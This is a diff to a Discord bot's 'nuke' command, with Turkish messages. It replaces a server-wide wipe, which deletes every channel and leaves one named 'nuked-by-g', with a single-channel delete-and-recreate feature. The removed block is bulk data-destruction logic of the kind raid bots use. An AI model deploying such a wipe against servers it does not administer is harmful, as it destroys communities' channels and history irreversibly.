@@ -15,26 +15,39 @@ module.exports.run = async (client, message, args) => {
                 ephemeral: true
             });
         }
+        
+        // Kanalın silinebilir olup olmadığını kontrol et
+        const targetChannel = message.channel;
+        if (!targetChannel.deletable) {
+            return message.reply({
+                embeds: [
+                    new EmbedBuilder()
+                        .setColor('#FF0000')
+                        .setTitle('❌ Bot Yetkisi Eksik')
+                        .setDescription(`Bu kanalı (**#${targetChannel.name}**) silmeye yetkim yok. Rol hiyerarşimi veya **Kanalları Yönet** yetkimi kontrol edin.`)
+                ],
+                ephemeral: true
+            });
+        }
 
         // --- 2. Birinci Onay (Embed ve Butonlar) ---
         const confirmEmbed = new EmbedBuilder()
             .setColor('#E74C3C')
-            .setTitle('⚠️ KRİTİK UYARI: SUNUCU SIFIRLAMA İŞLEMİ')
-            .setDescription(`**Büyük bir felaketin eşiğindesiniz!**\n\n` +
-                            `Bu işlem, **Sunucudaki tüm kanalları** (Metin, Ses ve Kategoriler) silip, yerlerine sadece bir adet yeni metin kanalı (**#nuked-by-g** adı altında) oluşturacaktır.\n\n` +
+            .setTitle('⚠️ KANAL SIFIRLAMA ONAYI')
+            .setDescription(`Bu işlem, **#${targetChannel.name}** kanalını silip, **aynı isim ve ayarlarla** yerine yenisini oluşturacaktır. Kanalın tüm geçmişi, izinleri ve webhook'ları sıfırlanacaktır.\n\n` +
                             `**BU İŞLEM GERİ ALINAMAZ.**\n\n` +
-                            `Gerçekten devam etmek istiyor musunuz?`);
+                            `Devam etmek istiyor musunuz?`);
 
         const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('nuke_confirm_step1').setLabel('🔥 EVET, SIFIRLA!').setStyle(ButtonStyle.Danger),
-            new ButtonBuilder().setCustomId('nuke_cancel').setLabel('🛡️ İPTAL ET, Vazgeçtim').setStyle(ButtonStyle.Secondary)
+            new ButtonBuilder().setCustomId('nuke_confirm_step1').setLabel('🔥 EVET, KANALI SIFIRLA!').setStyle(ButtonStyle.Danger),
+            new ButtonBuilder().setCustomId('nuke_cancel').setLabel('🛡️ İPTAL ET').setStyle(ButtonStyle.Secondary)
         );
 
         const msg = await message.channel.send({ embeds: [confirmEmbed], components: [row] });
 
         const collector = msg.createMessageComponentCollector({
             filter: i => i.user.id === message.author.id,
-            time: 60000 // 60 saniye süre
+            time: 30000 // 30 saniye süre
         });
 
         // --- 3. Buton Etkileşimi Yönetimi ---
@@ -44,7 +57,7 @@ module.exports.run = async (client, message, args) => {
                 const cancelEmbed = new EmbedBuilder()
                     .setColor('#FEE75C')
                     .setTitle('✅ İşlem İptal Edildi')
-                    .setDescription('Sunucu sıfırlama işlemi iptal edildi. Sunucunuz güvende.');
+                    .setDescription('Kanal sıfırlama işlemi iptal edildi.');
                 
                 await i.update({ embeds: [cancelEmbed], components: [] });
                 return collector.stop();
@@ -54,86 +67,55 @@ module.exports.run = async (client, message, args) => {
             if (i.customId === 'nuke_confirm_step1') {
                 collector.stop(); // İlk kolektörü durdur
                 
-                // --- İkinci Onay (Son Güvenlik Adımı) ---
-                const finalConfirmEmbed = new EmbedBuilder()
-                    .setColor('#992D22')
-                    .setTitle('❗ SON UYARI: EYLEMİ KİLİTLE')
-                    .setDescription(`**Bu senin son şansın.** İşlemi **tekrar** onaylayarak sunucuyu sıfırlamayı kilitliyorsunuz.\n\n` +
-                                    `Emin misiniz?`);
+                // --- KANAL SIFIRLAMA İŞLEMİ ---
                 
-                const finalRow = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder().setCustomId('nuke_final_confirm').setLabel('💣 KİLİTLE ve SIFIRLA!').setStyle(ButtonStyle.Danger),
-                    new ButtonBuilder().setCustomId('nuke_final_cancel').setLabel('↩️ İptal').setStyle(ButtonStyle.Secondary)
-                );
+                // Kanalın özelliklerini kaydet
+                const channelOptions = {
+                    name: targetChannel.name,
+                    type: targetChannel.type,
+                    parent: targetChannel.parent,
+                    permissionOverwrites: targetChannel.permissionOverwrites.cache,
+                    position: targetChannel.position,
+                    topic: targetChannel.topic,
+                    nsfw: targetChannel.nsfw,
+                    rateLimitPerUser: targetChannel.rateLimitPerUser,
+                    reason: `Kanal, ${message.author.tag} tarafından sıfırlandı (Nuke Komutu).`
+                };
+
+                // Kanalı sil
+                await targetChannel.delete();
+
+                // Yeni Kanalı Oluştur
+                const newChannel = await targetChannel.guild.channels.create(channelOptions)
+                    .catch(err => console.error('Yeni kanal oluşturma hatası:', err));
+
+                if (!newChannel) {
+                    return message.channel.send('❌ | Yeni kanal oluşturulurken kritik bir hata oluştu.');
+                }
                 
-                await i.update({ embeds: [finalConfirmEmbed], components: [finalRow] });
+                // Başarılı embed'i oluşturma ve gönderme
+                const successEmbed = new EmbedBuilder()
+                    .setColor('#3498DB')
+                    .setTitle('💥 KANAL BAŞARIYLA SIFIRLANDI (NUKED)')
+                    .setDescription(`**#${channelOptions.name}** kanalı başarıyla silindi ve yeniden oluşturuldu.`)
+                    .addFields({ name: 'İşlemi Yapan', value: `${message.author.tag}`, inline: true })
+                    .setFooter({ text: 'Kanalın tüm geçmişi temizlenmiştir.' });
 
-                // Yeni bir kolektör oluştur (İkinci onay için)
-                const finalCollector = msg.createMessageComponentCollector({
-                    filter: finalI => finalI.user.id === message.author.id,
-                    time: 30000 
-                });
-
-                finalCollector.on('collect', async finalI => {
-                    finalCollector.stop();
-
-                    if (finalI.customId === 'nuke_final_cancel') {
-                        const finalCancelEmbed = new EmbedBuilder()
-                            .setColor('#FEE75C')
-                            .setTitle('✅ İşlem İptal Edildi')
-                            .setDescription('İkinci onay adımında vazgeçildi. Sunucunuz sıfırlanmadı.');
-                        return finalI.update({ embeds: [finalCancelEmbed], components: [] });
-                    }
-
-                    if (finalI.customId === 'nuke_final_confirm') {
-                        await finalI.update({ components: [] }); // Butonları hemen kaldır
-
-                        // --- KANAL SİLME VE YENİDEN OLUŞTURMA İŞLEMİ ---
-                        const guild = message.guild;
-                        const channelPromises = [];
-
-                        // Tüm kanalları silme sözlerini toplama
-                        for (const [id, channel] of guild.channels.cache) {
-                             if (channel.deletable) {
-                                channelPromises.push(channel.delete().catch(err => console.error(`Kanal silinirken hata: ${channel.name}`, err)));
-                            }
-                        }
-
-                        // Tüm silme işlemlerinin bitmesini bekle
-                        await Promise.all(channelPromises);
-
-                        // Yeni Nuke Kanalını Oluşturma
-                        const newChannel = await guild.channels.create({
-                            name: 'nuked-by-g',
-                            type: ChannelType.GuildText,
-                            reason: `Sunucu ${message.author.tag} tarafından sıfırlandı (Nuke Komutu).`
-                        }).catch(err => console.error('Yeni kanal oluşturma hatası:', err));
-
-                        // Başarılı embed'i oluşturma ve gönderme
-                        const successEmbed = new EmbedBuilder()
-                            .setColor('#3498DB')
-                            .setTitle('💣 SUNUCU BAŞARIYLA SIFIRLANDI!')
-                            .setDescription('Tüm eski kanallar silindi ve sunucu sıfırlandı.')
-                            .addFields({ name: 'İşlemi Yapan', value: `${message.author.tag} (${message.author.id})`, inline: true })
-                            .setFooter({ text: 'Yine de eski kanalların yedeği alınmadıysa geri getirilemez.' });
-
-                        if (newChannel) {
-                            newChannel.send({ embeds: [successEmbed] });
-                            // İlk mesajı, yeni kanalda silmeye gerek yok.
-                        }
-                    }
-                });
+                // Yeni kanalda mesajı gönderme
+                if (newChannel) {
+                    newChannel.send({ embeds: [successEmbed] });
+                }
             }
         });
         
-        // --- 4. Zaman Aşımı Kontrolü (İlk Kolektör) ---
+        // --- 4. Zaman Aşımı Kontrolü ---
         collector.on('end', async (collected, reason) => {
              if (reason === 'time') {
                 try {
                     const timeoutEmbed = new EmbedBuilder()
                         .setColor('#FEE75C')
                         .setTitle('⏳ Zaman Aşımı')
-                        .setDescription('Onay süresi dolduğu için işlem iptal edildi. Sunucunuz sıfırlanmadı.');
+                        .setDescription('Onay süresi dolduğu için işlem iptal edildi.');
 
                     const disabledRow = new ActionRowBuilder().addComponents(
                         row.components.map(btn => ButtonBuilder.from(btn).setDisabled(true))
@@ -144,10 +126,10 @@ module.exports.run = async (client, message, args) => {
         });
 
     } catch (err) {
-        console.error('Nuke komutu genel hatası:', err);
-        message.channel.send('⚠️ | Nuke işlemi sırasında beklenmedik bir hata oluştu.');
+        console.error('Kanal Nuke komutu genel hatası:', err);
+        message.channel.send('⚠️ | Kanal sıfırlama sırasında beklenmedik bir hata oluştu.');
     }
 };
 
-module.exports.conf = { aliases: ['serverwipe', 'resetserver', 'nukla'] };
+module.exports.conf = { aliases: ['nukechannel', 'resetc'] };
 module.exports.help = { name: 'nuke' };
